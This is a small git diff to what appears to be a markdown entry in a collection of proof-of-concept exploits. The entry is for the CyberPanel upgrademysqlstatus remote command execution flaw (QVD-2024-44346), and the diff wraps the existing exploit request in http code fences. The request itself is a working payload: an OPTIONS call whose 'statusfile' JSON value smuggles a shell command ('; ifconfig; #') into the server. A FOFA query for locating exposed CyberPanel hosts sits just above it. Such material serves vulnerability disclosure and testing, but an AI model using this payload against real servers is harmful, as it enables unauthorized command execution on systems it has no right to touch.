@@ -72,6 +72,7 @@ FOFA：app="CyberPanel"
 
 POC/EXP：
 
+```http
 OPTIONS /dataBases/upgrademysqlstatus HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
@@ -79,6 +80,7 @@ Content-Type: application/json
 Connection: close
 
 {"statusfile":"/dev/null; ifconfig; #"}
+```
 
 ![image-20241028193933385](./.resource/CyberPanelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028193933385.png)
 
